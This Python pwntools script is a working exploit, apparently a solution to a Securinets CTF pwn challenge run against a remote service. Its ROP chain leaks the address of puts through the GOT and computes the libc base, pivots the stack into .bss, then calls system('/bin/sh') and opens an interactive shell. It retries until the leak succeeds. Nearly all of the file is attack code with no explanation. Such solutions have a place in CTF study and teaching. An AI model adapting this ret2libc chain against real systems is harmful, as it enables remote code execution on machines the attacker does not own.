#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import sys

from pwn import *

elf = context.binary = ELF("./main")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    # pwn.ctf.securinets.tn 6666
    host = args.HOST or 'pwn.ctf.securinets.tn'
    port = int(args.PORT or 6666)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
while True:
    io = start()

    # stack pivot gadget
    pop_ebp_cld_leave_ret = 0x080491cf

    ret = 0x0804923b
    writable = elf.bss(0xa00)

    # pad = 0x50
    payload = b""
    payload += flat(
        ret, ret, ret, ret,
        ret, ret, ret, ret,
        ret, ret, ret, ret,
        ret, ret,
        elf.plt["puts"],
        0x0804923a,  # pop ebx, ret  ; clean up puts arg
        elf.got["puts"],
        elf.plt["gets"],
        pop_ebp_cld_leave_ret,
        writable,
    )
    # payload = payload.ljust(0x50, b"A")
    # log.info(f"{len(payload)=:#x}")

    io.sendlineafter(b"solveable?\n", payload)

    leak = io.recvline(keepends=False, timeout=1)
    if len(leak) < 4:
        io.close()
        continue

    leak_puts = u32(leak[:4])
    libc.address = leak_puts - libc.symbols["puts"]

    log.info(f"{libc.address=:#x}")
    log.info(f"bss @ {writable:#x}")

    payload = flat(
        0,
        libc.symbols["system"],
        elf.symbols["main"],
        next(libc.search(b"/bin/sh\x00")),
    )

    io.sendline(payload)
    io.interactive()
